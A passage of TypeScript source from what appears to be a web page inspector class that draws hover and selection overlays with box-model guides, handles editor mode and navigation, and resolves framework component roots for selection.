  private clearHoverOverlay(): void {
    for (const el of this.hoverElements) el.remove()
    this.hoverElements = []
    this.hoverDrawn = null
  }

  /** Clear only the persistent selection layer \u2014 leaves the hover layer
   *  untouched. */
  private clearSelectionOverlay(): void {
    for (const el of this.selectionElements) el.remove()
    this.selectionElements = []
    this.selectionDrawn = null
  }

  /** Full clear \u2014 both layers. Used by paths that tear down the whole
   *  overlay (deactivate, navigation, mode-switch, explicit deselect), not
   *  by routine hover/selection redraws (those clear only their own layer). */
  private clearOverlay(): void {
    this.clearHoverOverlay()
    this.clearSelectionOverlay()
  }

  /**
   * Draws the box (dashed outline + dimensions + tag + box-model guides)
   * into one of two independent layers:
   * - `"selection"` \u2014 firm `--selected` chrome, persists until the next
   *   selection or an explicit clear. Lives in `selectionElements`.
   * - `"hover"` \u2014 lighter dashed box, redrawn on every mousemove. Lives in
   *   `hoverElements` and never touches the selection layer.
   *
   * Each call clears and redraws only its own layer, so a hover elsewhere
   * never clobbers a committed selection (Fix 3) and a new selection never
   * has to fight a stale hover box.
   *
   * Both layers track scroll and resize: the draw is recorded in
   * `selectionDrawn`/`hoverDrawn` and replayed by `repositionOverlays` on the
   * next frame after a scroll. Before that, the chrome was `position: fixed`
   * at a rect captured once, so scrolling slid the element out from under its
   * own highlight. The hover layer hid this (it redraws on the next mousemove)
   * while the selection layer stayed stale until the next click.
   */
  private showOverlay(el: Element, layer: "hover" | "selection", componentName?: string): void {
    const selected = layer === "selection"
    // Clear first, then record \u2014 the clears null the records by design, so the
    // opposite order would erase what we just captured.
    if (selected) {
      this.clearSelectionOverlay()
      this.selectionDrawn = { el, componentName }
    } else {
      this.clearHoverOverlay()
      this.hoverDrawn = { el, componentName }
    }
    const target = selected ? this.selectionElements : this.hoverElements
    // Hover fills read lighter than selection fills (Fix 2) via an extra
    // class \u2014 see `.pt-inspect-fill--hover` in INSPECTOR_OVERLAY_STYLES.
    const hoverDim = selected ? "" : " pt-inspect-fill--hover"

    const rect = el.getBoundingClientRect()
    const computed = window.getComputedStyle(el)

    const overlay = document.createElement("div")
    overlay.className = `pt-inspect-overlay${selected ? " pt-inspect-overlay--selected" : ""}`
    overlay.style.top = `${rect.top}px`
    overlay.style.left = `${rect.left}px`
    overlay.style.width = `${rect.width}px`
    overlay.style.height = `${rect.height}px`
    this.shadow.appendChild(overlay)
    target.push(overlay)

    const tag = buildInspectTag(el, componentName)
    const tagTop = rect.top - 20
    tag.style.top = `${tagTop < 0 ? rect.top + 2 : tagTop}px`
    tag.style.left = `${rect.left}px`
    this.shadow.appendChild(tag)
    target.push(tag)

    // Box-model fills: margin (orange) + padding (green) + content (blue).
    // Drawn on EVERY call now (hover included) \u2014 previously gated on
    // `selected`, which editor mode never reached, so hover never showed
    // box-model guides at all (Fix 2).
    const pt = parseFloat(computed.paddingTop)
    const pr = parseFloat(computed.paddingRight)
    const pb = parseFloat(computed.paddingBottom)
    const pl = parseFloat(computed.paddingLeft)
    if (pt > 0) this.addGuide(`pt-inspect-padding${hoverDim}`, rect.left, rect.top, rect.width, pt, target)
    if (pb > 0) this.addGuide(`pt-inspect-padding${hoverDim}`, rect.left, rect.bottom - pb, rect.width, pb, target)
    if (pl > 0) this.addGuide(`pt-inspect-padding${hoverDim}`, rect.left, rect.top + pt, pl, rect.height - pt - pb, target)
    if (pr > 0) this.addGuide(`pt-inspect-padding${hoverDim}`, rect.right - pr, rect.top + pt, pr, rect.height - pt - pb, target)

    const mt = parseFloat(computed.marginTop)
    const mr = parseFloat(computed.marginRight)
    const mb = parseFloat(computed.marginBottom)
    const ml = parseFloat(computed.marginLeft)
    if (mt > 0) this.addGuide(`pt-inspect-margin${hoverDim}`, rect.left - ml, rect.top - mt, rect.width + ml + mr, mt, target)
    if (mb > 0) this.addGuide(`pt-inspect-margin${hoverDim}`, rect.left - ml, rect.bottom, rect.width + ml + mr, mb, target)
    if (ml > 0) this.addGuide(`pt-inspect-margin${hoverDim}`, rect.left - ml, rect.top, ml, rect.height, target)
    if (mr > 0) this.addGuide(`pt-inspect-margin${hoverDim}`, rect.right, rect.top, mr, rect.height, target)

    // Gap bands, between the children rather than around this element.
    for (const b of gapBands(el, computed)) {
      this.addGuide(`pt-inspect-gap${hoverDim}`, b.left, b.top, b.width, b.height, target)
    }

    // Content box: border-box (the rect from getBoundingClientRect) inset by
    // padding. Approximation \u2014 ignores border thickness, matching the
    // pre-existing padding-guide math above rather than introducing new
    // border-width handling out of scope for this fix.
    const contentWidth = rect.width - pl - pr
    const contentHeight = rect.height - pt - pb
    if (contentWidth > 0 && contentHeight > 0) {
      this.addGuide(`pt-inspect-content${hoverDim}`, rect.left + pl, rect.top + pt, contentWidth, contentHeight, target)
    }
  }

  private addGuide(className: string, left: number, top: number, width: number, height: number, target: HTMLElement[]): void {
    const guide = document.createElement("div")
    guide.className = className
    guide.style.left = `${left}px`
    guide.style.top = `${top}px`
    guide.style.width = `${width}px`
    guide.style.height = `${height}px`
    this.shadow.appendChild(guide)
    target.push(guide)
  }

  highlightElement(el: Element): void {
    this.selectedElement = el
    this.hoveredElement = null
    this.showOverlay(el, "selection")
  }

  /**
   * Non-committal hover preview. Draws into the hover layer (never the
   * selection layer) without touching `selectedElement`. Editor's layers
   * panel calls this on tree-row hover; passing `null` clears the preview.
   * Distinct from `highlightElement` which commits selection.
   *
   * Now that hover and selection are separate layers (Fix 3), clearing the
   * preview can never clobber a committed selection, so the null-branch no
   * longer needs the editorMode/selectedElement guard it used to (that
   * guard existed only because the old single-slot model conflated the two).
   *
   * The show-branch keeps its existing review-app guard: in review-app mode
   * with something selected, a preview is still skipped rather than drawing
   * a hover box the user didn't ask for alongside their selection.
   */
  previewHighlight(el: Element | null): void {
    if (!el) {
      this.clearHoverOverlay()
      return
    }
    if (!this.editorMode && this.selectedElement) return
    const name = this.resolveComponentName(el)
    this.showOverlay(el, "hover", name)
  }

  getSelectedElement(): Element | null {
    return this.selectedElement
  }

  setEditorMode(enabled: boolean): void {
    this.editorMode = enabled
    if (enabled) {
      // Drop any review-app-rendered chrome — editor takes over rendering.
      this.clearOverlay()
    } else {
      // Cancel any pending hover-event emission.
      if (this.hoverRafToken !== 0) {
        cancelAnimationFrame(this.hoverRafToken)
        this.hoverRafToken = 0
      }
      this.lastHoverTarget = null
    }
  }

  /** Read whether editor mode is active. Used by the message dispatch
   *  to gate editor-only response shapes (e.g., the tiered
   *  ELEMENT_INSPECTION_UNRESOLVED variants on INSPECT_SELECTOR) so
   *  legacy review-app and MCP callers keep getting the original
   *  `ELEMENT_INSPECTED { payload: null }` no-match response. */
  isEditorMode(): boolean {
    return this.editorMode
  }

  /** Read whether the inspector is currently activated (click+hover trap
   *  attached). DOM-edit mode reads this so it can suspend the inspector
   *  during capture and restore on exit. */
  isActive(): boolean {
    return this.active
  }

  /** Clear only the current selection — leave the inspector active and
   *  listeners attached. Editor dispatches `CLEAR_SELECTION` here so
   *  the bridge's `selectedElement` doesn't drift out of sync with
   *  editor's own state (which would cause the next click on the
   *  same element to take the toggle-deselect branch). Full `clearOverlay()`
   *  (both layers) so the persistent selection layer (Fix 3) is dropped too
   *  — the hover layer will simply redraw fresh on the next mousemove. */
  clearSelectedOnly(): void {
    this.selectedElement = null
    this.hoveredElement = null
    this.clearOverlay()
  }

  /** Route changed (SPA pushState/replaceState, popstate, or full reload).
   *  The previously hovered/selected nodes are detached from the new
   *  document, so any overlay drawn over them is stale — it would linger
   *  frozen at the old coordinates until the next mousemove. Drop the
   *  tracked elements and clear the overlay. Listeners stay attached: the
   *  inspector keeps working on the new page and the next mousemove draws
   *  a fresh hover box. Registered in `comment-bridge.ts` navigation
   *  callbacks alongside the recorder/player/pins handlers. */
  handleNavigation(): void {
    this.selectedElement = null
    this.hoveredElement = null
    this.clearOverlay()
  }

  setHoverEventsEnabled(enabled: boolean): void {
    this.hoverEventsEnabled = enabled
    if (!enabled && this.hoverRafToken !== 0) {
      cancelAnimationFrame(this.hoverRafToken)
      this.hoverRafToken = 0
      this.lastHoverTarget = null
    }
  }

  /** Programmatic select-at-point. Backs `INSPECT_POINT`. Returns the resolved
   *  element when one was selected, or null when no inspectable element was at
   *  the point.
   *
   *  In editor mode, climbs to the nearest registered framework component
   *  root before selecting — the design contract says clicks resolve to
   *  registered components, not internal DOM. Modifier-click drilling into
   *  non-system content is the future Tier 4 INSPECT_CHILD with mode='dom'
   *  path; this method covers the primary "click to select component" case.
   *
   *  Outside editor mode, falls back to the literal element-at-point
   *  (matches the legacy review-app inspector's leaf-DOM behavior). */
  selectAtPoint(x: number, y: number): Element | null {
    if (!this.active) return null
    const leaf = document.elementFromPoint(x, y)
    if (!leaf || this.isOwnElement(leaf)) return null
    const target = this.editorMode ? this.resolveComponentRoot(leaf) : leaf
    this.selectedElement = target
    this.hoveredElement = null
    const name = this.resolveComponentName(target)
    this.showOverlay(target, "selection", name)
    return target
  }

  /** Walk up DOM ancestors to find the nearest registered framework
   *  component root, including `el` itself. Falls back to `el` when no
   *  component is found (e.g., in plain HTML prototypes). */
  private resolveComponentRoot(el: Element): Element {
    let current: Element | null = el
    while (current && current !== document.documentElement) {
      try {
        if (detectDirectComponent(current)) return current
      } catch { /* ignore */ }
      current = current.parentElement
    }
    return el
  }

  /** Walk DOM ancestors and return the first registered framework component
   *  above `el`. Backs `INSPECT_PARENT`. */
  findParentComponent(el: Element): Element | null {
    let current: Element | null = el.parentElement
    while (current && current !== document.documentElement) {
      try {
        if (detectDirectComponent(current)) return current
      } catch { /* ignore */ }
      current = current.parentElement
    }
    return null
  }

  /** Update internal selection state to match a programmatic selection. */
  setSelectedElement(el: Element): void {
    this.selectedElement = el
    this.hoveredElement = null
    const name = this.resolveComponentName(el)
    this.showOverlay(el, "selection", name)
  }
}
